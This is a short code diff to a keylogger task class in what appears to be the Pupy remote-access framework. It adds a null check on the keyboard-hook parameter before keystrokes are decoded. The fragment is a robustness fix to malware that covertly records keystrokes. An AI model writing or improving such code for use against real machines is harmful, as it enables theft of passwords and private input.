@@ -213,6 +213,9 @@ class KeyLogger(pupy.Task):
         if LOWORD(wParam) not in (WM_KEYUP, WM_SYSKEYUP):
             return
 
+        if not lParam:
+            return
+
         keyState = (BYTE * 256)()
         buff = (WCHAR * 256)()
         kbdllhookstruct = KBDLLHOOKSTRUCT.from_address(lParam)
